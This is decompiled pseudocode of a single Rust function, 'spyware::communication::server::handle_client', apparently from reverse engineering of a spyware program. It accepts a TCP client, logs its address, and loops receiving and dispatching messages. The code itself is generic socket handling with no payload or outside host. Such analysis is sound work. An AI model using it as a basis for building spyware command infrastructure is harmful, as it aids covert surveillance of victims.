__int64 __fastcall spyware::communication::server::handle_client(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rcx
  __int64 v8; // rdx
  __int64 v9; // rcx
  __int64 v10; // rax
  unsigned int v12; // [rsp+4h] [rbp-F4h] BYREF
  __int64 v13; // [rsp+8h] [rbp-F0h] BYREF
  __int128 v14; // [rsp+10h] [rbp-E8h] BYREF
  __m256i v15; // [rsp+20h] [rbp-D8h]
  __int128 v16; // [rsp+40h] [rbp-B8h]
  __int128 v17; // [rsp+50h] [rbp-A8h] BYREF
  __m256i v18; // [rsp+60h] [rbp-98h]
  __int128 v19; // [rsp+80h] [rbp-78h]
  __int64 *v20; // [rsp+90h] [rbp-68h] BYREF
  __int64 (__fastcall *v21)(); // [rsp+98h] [rbp-60h]
  __int128 v22; // [rsp+A0h] [rbp-58h] BYREF
  __m256i v23; // [rsp+B0h] [rbp-48h]
  __int128 v24; // [rsp+D0h] [rbp-28h]
  __int128 v25; // [rsp+E0h] [rbp-18h]

  v12 = a1;
  if ( (unsigned __int64)core::sync::atomic::atomic_load(a1, a2, a3, a4) >= 4 )
  {
    std::net::tcp::TcpStream::peer_addr(&v14, &v12);
    if ( (_WORD)v14 == 2 )
    {
      v4 = *((_QWORD *)&v14 + 1);
      goto LABEL_9;
    }
    v22 = v14;
    v25 = *(_OWORD *)v15.m256i_i8;
    *(_OWORD *)v23.m256i_i8 = *(_OWORD *)v15.m256i_i8;
    v20 = (__int64 *)&v22;
    v21 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
    *(_QWORD *)&v17 = &off_B8C30;
    *((_QWORD *)&v17 + 1) = 1LL;
    v18.m256i_i64[0] = (__int64)&v20;
    *(_OWORD *)&v18.m256i_u64[1] = 1uLL;
    v5 = log::__private_api::loc(&off_B8C70);
    *(_QWORD *)&v14 = aSpywareCommuni;
    *((_QWORD *)&v14 + 1) = 30LL;
    v15.m256i_i64[0] = (__int64)aSpywareCommuni;
    v15.m256i_i64[1] = 30LL;
    v15.m256i_i64[2] = v5;
    log::__private_api::log(&v17, 4LL, &v14);
  }
  while ( 1 )
  {
    spyware::communication::server::get_message((__int64)&v22, (__int64)&v12);
    if ( (_QWORD)v22 == 0x800000000000000ALL )
      break;
    v16 = v24;
    v15 = v23;
    v14 = v22;
    *(_QWORD *)&v17 = &off_B8C50;
    *((_QWORD *)&v17 + 1) = 1LL;
    v18.m256i_i64[0] = 8LL;
    *(_OWORD *)&v18.m256i_u64[1] = 0LL;
    std::io::stdio::_print(&v17);
    v19 = v16;
    v18 = v15;
    v17 = v14;
    spyware::communication::server::handle_message((__int64)&v17, (char **)&v12, v6, v7);
  }
  v4 = *((_QWORD *)&v22 + 1);
  v13 = *((_QWORD *)&v22 + 1);
  *(_QWORD *)&v17 = &off_B8C40;
  *((_QWORD *)&v17 + 1) = 1LL;
  v18.m256i_i64[0] = 8LL;
  *(_OWORD *)&v18.m256i_u64[1] = 0LL;
  std::io::stdio::_print(&v17);
  if ( core::sync::atomic::atomic_load(&v17, &v12, v8, v9) )
  {
    v20 = &v13;
    v21 = <std::io::error::Error as core::fmt::Display>::fmt;
    *(_QWORD *)&v17 = &off_B8C60;
    *((_QWORD *)&v17 + 1) = 1LL;
    v18.m256i_i64[0] = (__int64)&v20;
    *(_OWORD *)&v18.m256i_u64[1] = 1uLL;
    v10 = log::__private_api::loc(&off_B8C88);
    *(_QWORD *)&v14 = aSpywareCommuni;
    *((_QWORD *)&v14 + 1) = 30LL;
    v15.m256i_i64[0] = (__int64)aSpywareCommuni;
    v15.m256i_i64[1] = 30LL;
    v15.m256i_i64[2] = v10;
    log::__private_api::log(&v17, 1LL, &v14);
    v4 = v13;
  }
LABEL_9:
  core::ptr::drop_in_place<std::net::tcp::TcpStream>(v12);
  return v4;
}